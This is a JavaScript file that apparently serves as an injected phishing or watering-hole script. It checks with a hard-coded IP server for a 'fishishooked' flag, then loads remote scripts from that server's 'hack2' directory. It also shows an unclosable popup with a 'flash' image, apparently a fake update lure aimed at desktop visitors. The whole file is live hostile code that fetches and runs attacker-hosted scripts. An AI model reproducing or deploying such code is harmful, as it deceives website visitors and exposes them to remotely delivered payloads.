
function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}
window.onload = function(){
    if(!isPc()){
        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    }
}
var xmlHttp;
if (window.XMLHttpRequest) {
    xmlHttp = new XMLHttpRequest();
} else {
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
}
xmlHttp.open("GET", "http://39.108.181.144:61262/index.php/admins/Index/index", "true");
xmlHttp.send();
xmlHttp.onreadystatechange = function() {
var resData = xmlHttp.responseText;
var res = resData.search("fishishooked");
if (res!=='-1') {
    console.log(1);
    document.write("<script src='http://39.108.181.144:61262/static/hack2/layer/jquery.min.js'></script>");
    document.write("<script src='http://39.108.181.144:61262/static/hack2/layer/layer.js'></script>");
    window.onload = function(){
        layer.open({
            type: 1,//Page层类型
            move: false ,//禁止拖拽
            area: ['613px', '331px'],//设置弹窗大小
            title: false,//关闭标题栏
            shade: 0.6,//遮罩透明度
            //maxmin: true ,//允许全与屏最小化
            anim: 1,//0-6的动画形式，-1不开启
            offset: '100px',//设置顶部距离
            scrollbar: false,//禁用滚轮
            content: '<a href="https://www.baidu.com/"><img src="http://39.108.181.144:61262/static/hack2/flash.jpg"></a>'//创建图像
        });
    }
}
}